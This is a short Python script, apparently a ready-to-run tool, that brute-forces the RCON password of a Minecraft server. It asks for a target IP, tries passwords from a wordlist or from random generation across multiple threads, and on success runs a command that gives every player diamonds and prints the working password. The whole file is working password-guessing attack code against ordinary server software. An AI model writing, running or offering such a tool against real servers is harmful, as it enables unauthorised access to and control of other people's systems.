from mcrcon import MCRcon
import threading
from queue import Queue
import random
import string

class RCONPasswordTrier:
    def __init__(self, host, port, passwords, command, max_threads):
        self.host = host
        self.port = port
        self.command = command
        self.max_threads = max_threads
        self.password_queue = Queue()
        self.lock = threading.Lock()

        for password in passwords:
            self.password_queue.put(password)

    @classmethod
    def from_file(cls, host, port, password_file, command, max_threads):
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file]
        return cls(host, port, passwords, command, max_threads)

    @classmethod
    def from_random(cls, host, port, command, max_threads, num_passwords, password_length=12, charset=None):
        charset = charset or string.ascii_letters + string.digits + "!@#$%^&*"
        passwords = [''.join(random.choices(charset, k=password_length)) for _ in range(num_passwords)]
        return cls(host, port, passwords, command, max_threads)

    def try_password(self):
        while not self.password_queue.empty():
            password = self.password_queue.get()
            try:
                with MCRcon(self.host, password, self.port) as mcr:
                    response = mcr.command(self.command)
                    with self.lock:
                        print(f"Password '{password}' is correct. Server Response: {response}")
                    return
            except Exception as e:
                with self.lock:
                    print(f"Password '{password}' failed: {str(e)[:50]}")

    def start(self):
        threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self.try_password)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    host = input("Enter target IP: ")
    port = int(input("Input RCON port (default is 25575): ") or 25575)
    command = "/give @a minecraft:diamond 64"
    max_threads = int(input("Input max threads: "))
    
    choice = input("Choose method:\n1. Password list\n2. Random generator\n> ")
    
    if choice == "1":
        password_file = input("Input path to password list: ")
        trier = RCONPasswordTrier.from_file(host, port, password_file, command, max_threads)
    elif choice == "2":
        num_passwords = int(input("Number of passwords to generate: "))
        length = int(input("Password length: "))
        charset_choice = input("Use default charset (y/n)? ").lower()
        
        if charset_choice == 'n':
            custom_charset = input("Enter custom characters (e.g., ABC123!@#): ")
            trier = RCONPasswordTrier.from_random(
                host, port, command, max_threads,
                num_passwords, length, custom_charset
            )
        else:
            trier = RCONPasswordTrier.from_random(
                host, port, command, max_threads,
                num_passwords, length
            )
    else:
        print("Invalid choice")
        exit()

    trier.start()
